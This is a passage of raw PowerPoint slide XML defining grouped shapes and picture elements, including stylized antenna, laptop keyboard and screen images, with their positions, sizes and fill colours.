                  <a:off x="8238960" y="5108400"/>
                  <a:ext cx="88560" cy="23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38" name="CustomShape 216"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8153280" y="517680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39" name="Group 217"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="8237520" y="5170320"/>
                <a:ext cx="91800" cy="26640"/>
                <a:chOff x="8237520" y="5170320"/>
                <a:chExt cx="91800" cy="26640"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="440" name="CustomShape 218"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="8237520" y="5170320"/>
                  <a:ext cx="9180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41" name="CustomShape 219"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="8239320" y="5173560"/>
                  <a:ext cx="88560" cy="205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42" name="CustomShape 220"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8153280" y="524340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43" name="CustomShape 221"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8155080" y="530388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44" name="Group 222"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="8236080" y="5302080"/>
                <a:ext cx="91800" cy="26640"/>
                <a:chOff x="8236080" y="5302080"/>
                <a:chExt cx="91800" cy="26640"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="445" name="CustomShape 223"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="8236080" y="5302080"/>
                  <a:ext cx="9180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46" name="CustomShape 224"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="8237520" y="5302080"/>
                  <a:ext cx="88560" cy="23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47" name="CustomShape 225"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8323560" y="5243400"/>
                <a:ext cx="4140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48" name="Group 226"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="8236080" y="5238720"/>
                <a:ext cx="93240" cy="26640"/>
                <a:chOff x="8236080" y="5238720"/>
                <a:chExt cx="93240" cy="26640"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="449" name="CustomShape 227"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="8236080" y="5238720"/>
                  <a:ext cx="9324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50" name="CustomShape 228"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="8237520" y="5241960"/>
                  <a:ext cx="91800" cy="201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51" name="CustomShape 229"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8316720" y="5057640"/>
                <a:ext cx="10800" cy="4582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2" name="CustomShape 230"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8327520" y="5173920"/>
                <a:ext cx="3744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3" name="CustomShape 231"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8327880" y="5108040"/>
                <a:ext cx="3852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4" name="CustomShape 232"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8359920" y="5495760"/>
                <a:ext cx="7560" cy="1872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5" name="CustomShape 233"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8325720" y="5496480"/>
                <a:ext cx="385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6" name="CustomShape 234"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8140680" y="5508720"/>
                <a:ext cx="190080" cy="298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7" name="CustomShape 235"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8151840" y="5516640"/>
                <a:ext cx="169560" cy="154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1F497D"/>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="EEECE1"/>
                  </a:gs>
                </a:gsLst>
                <a:lin ang="0"/>
              </a:gra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8" name="CustomShape 236"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8167680" y="5449680"/>
                <a:ext cx="24840" cy="2808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59" name="CustomShape 237"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8196120" y="5449680"/>
                <a:ext cx="24840" cy="280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0" name="CustomShape 238"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8223120" y="5449680"/>
                <a:ext cx="24840" cy="2808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1" name="CustomShape 239"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8288280" y="5340600"/>
                <a:ext cx="12240" cy="151920"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="292929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62" name="Group 240"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="7824960" y="5359320"/>
              <a:ext cx="226440" cy="480960"/>
              <a:chOff x="7824960" y="5359320"/>
              <a:chExt cx="226440" cy="480960"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="463" name="CustomShape 241"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8004600" y="5360040"/>
                <a:ext cx="44640" cy="45864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4" name="CustomShape 242"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7835760" y="5359320"/>
                <a:ext cx="166320" cy="45828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5" name="CustomShape 243"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8012880" y="5387760"/>
                <a:ext cx="26640" cy="424080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6" name="CustomShape 244"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8007120" y="5602680"/>
                <a:ext cx="4140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67" name="CustomShape 245"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7835760" y="541188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68" name="Group 246"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7921800" y="5406840"/>
                <a:ext cx="91800" cy="29880"/>
                <a:chOff x="7921800" y="5406840"/>
                <a:chExt cx="91800" cy="29880"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="469" name="CustomShape 247"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7921800" y="5406840"/>
                  <a:ext cx="91800" cy="298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70" name="CustomShape 248"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7923240" y="5410080"/>
                  <a:ext cx="88560" cy="23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71" name="CustomShape 249"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7837560" y="547848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72" name="Group 250"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7921440" y="5472000"/>
                <a:ext cx="91800" cy="26640"/>
                <a:chOff x="7921440" y="5472000"/>
                <a:chExt cx="91800" cy="26640"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="473" name="CustomShape 251"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7921440" y="5472000"/>
                  <a:ext cx="9180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74" name="CustomShape 252"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7923240" y="5475240"/>
                  <a:ext cx="88560" cy="2052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75" name="CustomShape 253"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7837560" y="554508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76" name="CustomShape 254"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7839000" y="5605560"/>
                <a:ext cx="95040" cy="90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77" name="Group 255"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7920000" y="5603760"/>
                <a:ext cx="91800" cy="26640"/>
                <a:chOff x="7920000" y="5603760"/>
                <a:chExt cx="91800" cy="26640"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="478" name="CustomShape 256"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7920000" y="5603760"/>
                  <a:ext cx="9180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79" name="CustomShape 257"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7921800" y="5603760"/>
                  <a:ext cx="88560" cy="23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80" name="CustomShape 258"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8007840" y="5545080"/>
                <a:ext cx="4140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81" name="Group 259"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="7920000" y="5540400"/>
                <a:ext cx="93240" cy="26640"/>
                <a:chOff x="7920000" y="5540400"/>
                <a:chExt cx="93240" cy="26640"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="482" name="CustomShape 260"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7920000" y="5540400"/>
                  <a:ext cx="93240" cy="266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83" name="CustomShape 261"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7921440" y="5543640"/>
                  <a:ext cx="91800" cy="201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484" name="CustomShape 262"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8001000" y="5359320"/>
                <a:ext cx="10800" cy="45828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5" name="CustomShape 263"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8011440" y="5475600"/>
                <a:ext cx="3744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6" name="CustomShape 264"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8011800" y="5409720"/>
                <a:ext cx="3852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7" name="CustomShape 265"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8043840" y="5797440"/>
                <a:ext cx="7560" cy="1872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8" name="CustomShape 266"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="8010000" y="5798160"/>
                <a:ext cx="385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9" name="CustomShape 267"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7824960" y="5810400"/>
                <a:ext cx="190080" cy="2988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0" name="CustomShape 268"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7835760" y="5817960"/>
                <a:ext cx="169560" cy="154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1F497D"/>
                  </a:gs>
                  <a:gs pos="100000">
                    <a:srgbClr val="EEECE1"/>
                  </a:gs>
                </a:gsLst>
                <a:lin ang="0"/>
              </a:gra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1" name="CustomShape 269"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7851600" y="5751360"/>
                <a:ext cx="24840" cy="2808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2" name="CustomShape 270"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7880400" y="5751360"/>
                <a:ext cx="24840" cy="280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3" name="CustomShape 271"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7907400" y="5751360"/>
                <a:ext cx="24840" cy="2808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4" name="CustomShape 272"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7972560" y="5641920"/>
                <a:ext cx="12240" cy="151920"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="292929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95" name="Group 273"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5202360" y="2098800"/>
              <a:ext cx="534600" cy="413280"/>
              <a:chOff x="5202360" y="2098800"/>
              <a:chExt cx="534600" cy="413280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="496" name="Picture 1178" descr="antenna_stylized"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId12"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5202360" y="2098800"/>
                <a:ext cx="530280" cy="223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97" name="Picture 1179" descr="laptop_keyboard"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId13"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm rot="88200" flipH="1">
                <a:off x="5229360" y="2347200"/>
                <a:ext cx="436680" cy="15912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498" name="CustomShape 274"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5373000" y="2192400"/>
                <a:ext cx="351720" cy="207720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pic>
            <p:nvPicPr>
              <p:cNvPr id="499" name="Picture 1181" descr="screen"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId14"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5390280" y="2197800"/>
                <a:ext cx="319320" cy="1890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00" name="CustomShape 275"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5437080" y="2186280"/>
                <a:ext cx="2977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1" name="CustomShape 276"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5369760" y="2185920"/>
                <a:ext cx="8244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2" name="CustomShape 277"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5643720" y="2214720"/>
                <a:ext cx="8892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3" name="CustomShape 278"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5368680" y="2338920"/>
                <a:ext cx="32688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4" name="CustomShape 279"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5653800" y="2216160"/>
                <a:ext cx="83160" cy="186480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5" name="CustomShape 280"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5369040" y="2347200"/>
                <a:ext cx="2905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506" name="Group 281"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="5364360" y="2413440"/>
                <a:ext cx="98280" cy="36360"/>
                <a:chOff x="5364360" y="2413440"/>
                <a:chExt cx="98280" cy="36360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="507" name="CustomShape 282"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5364360" y="2413440"/>
                  <a:ext cx="98280" cy="3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08" name="CustomShape 283"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5366160" y="2414520"/>
                  <a:ext cx="95040" cy="3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09" name="CustomShape 284"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5373360" y="2428200"/>
                  <a:ext cx="33480" cy="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10" name="CustomShape 285"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5371920" y="2433240"/>
                  <a:ext cx="2520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11" name="CustomShape 286"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5401080" y="2435400"/>
                  <a:ext cx="33480" cy="11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12" name="CustomShape 287"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5400000" y="2440800"/>
                  <a:ext cx="2520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513" name="CustomShape 288"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5533200" y="2419200"/>
                <a:ext cx="1191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4" name="CustomShape 289"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5228280" y="2425680"/>
                <a:ext cx="30564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5" name="CustomShape 290"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5228280" y="2412000"/>
                <a:ext cx="288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6" name="CustomShape 291"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5228640" y="2351160"/>
                <a:ext cx="14184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7" name="CustomShape 292"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5238000" y="2415240"/>
                <a:ext cx="28980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8" name="CustomShape 293"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="5527800" y="2409480"/>
                <a:ext cx="118080" cy="7308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19" name="Group 294"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="6772320" y="5541840"/>
              <a:ext cx="474120" cy="413280"/>
              <a:chOff x="6772320" y="5541840"/>
              <a:chExt cx="474120" cy="413280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="520" name="Picture 1202" descr="antenna_stylized"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId15"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="6772320" y="5541840"/>
                <a:ext cx="470520" cy="223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521" name="Picture 1203" descr="laptop_keyboard"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId16"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm rot="99600" flipH="1">
                <a:off x="6795720" y="5790240"/>
                <a:ext cx="387360" cy="15912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22" name="CustomShape 295"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6923520" y="5635800"/>
                <a:ext cx="311760" cy="207720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pic>
            <p:nvPicPr>
              <p:cNvPr id="523" name="Picture 1205" descr="screen"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId17"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="6939000" y="5640840"/>
                <a:ext cx="283320" cy="1890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24" name="CustomShape 296"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6980400" y="5629680"/>
                <a:ext cx="264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5" name="CustomShape 297"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6921000" y="5629320"/>
                <a:ext cx="7308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6" name="CustomShape 298"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7164000" y="5658120"/>
                <a:ext cx="7884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7" name="CustomShape 299"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6919920" y="5782320"/>
                <a:ext cx="28980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8" name="CustomShape 300"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7172640" y="5659560"/>
                <a:ext cx="73800" cy="186480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9" name="CustomShape 301"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6920280" y="5790600"/>
                <a:ext cx="257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530" name="Group 302"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="6915960" y="5856840"/>
                <a:ext cx="87120" cy="36360"/>
                <a:chOff x="6915960" y="5856840"/>
                <a:chExt cx="87120" cy="36360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="531" name="CustomShape 303"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6915960" y="5856840"/>
                  <a:ext cx="87120" cy="3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32" name="CustomShape 304"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6917760" y="5857560"/>
                  <a:ext cx="84240" cy="3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33" name="CustomShape 305"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6923880" y="5871240"/>
                  <a:ext cx="29520" cy="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34" name="CustomShape 306"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6922800" y="5876640"/>
                  <a:ext cx="2232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35" name="CustomShape 307"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6948720" y="5878440"/>
                  <a:ext cx="29520" cy="11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36" name="CustomShape 308"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="6947640" y="5883840"/>
                  <a:ext cx="2232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537" name="CustomShape 309"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="7066080" y="5862240"/>
                <a:ext cx="105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38" name="CustomShape 310"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6795360" y="5868720"/>
                <a:ext cx="27108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39" name="CustomShape 311"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6795360" y="5855400"/>
                <a:ext cx="25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40" name="CustomShape 312"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6795720" y="5794200"/>
                <a:ext cx="12564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41" name="CustomShape 313"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="6804000" y="5858640"/>
                <a:ext cx="25704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42" name="CustomShape 314"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm flipV="1">
                <a:off x="7061040" y="5852880"/>
                <a:ext cx="104760" cy="7308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43" name="Group 315"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="5460840" y="3097080"/>
              <a:ext cx="444240" cy="413280"/>
              <a:chOff x="5460840" y="3097080"/>
              <a:chExt cx="444240" cy="413280"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="544" name="Picture 1226" descr="antenna_stylized"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId18"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5460840" y="3097080"/>
                <a:ext cx="440640" cy="223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545" name="Picture 1227" descr="laptop_keyboard"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId19"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm rot="106200" flipH="1">
                <a:off x="5482440" y="3345480"/>
                <a:ext cx="362880" cy="15912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46" name="CustomShape 316"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5602680" y="3191040"/>
                <a:ext cx="291960" cy="207720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pic>
            <p:nvPicPr>
              <p:cNvPr id="547" name="Picture 1229" descr="screen"/>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId20"/>
              <a:stretch/>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5617080" y="3196080"/>
                <a:ext cx="265320" cy="1890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48" name="CustomShape 317"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5655960" y="3184920"/>
                <a:ext cx="2473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49" name="CustomShape 318"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5600160" y="3184560"/>
                <a:ext cx="6840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50" name="CustomShape 319"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5827680" y="3213360"/>
                <a:ext cx="7380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51" name="CustomShape 320"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5599440" y="3337560"/>
                <a:ext cx="27144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52" name="CustomShape 321"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5835960" y="3214800"/>
                <a:ext cx="69120" cy="186480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53" name="CustomShape 322"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="5599800" y="3345840"/>
                <a:ext cx="2415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554" name="Group 323"/>
              <p:cNvGrpSpPr/>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr>
              <a:xfrm>
                <a:off x="5595480" y="3412080"/>
                <a:ext cx="81720" cy="36360"/>
                <a:chOff x="5595480" y="3412080"/>
                <a:chExt cx="81720" cy="36360"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="555" name="CustomShape 324"/>
                <p:cNvSpPr/>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr>
                <a:xfrm>
                  <a:off x="5595480" y="3412080"/>
                  <a:ext cx="81720" cy="3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56" name="CustomShape 325"/>
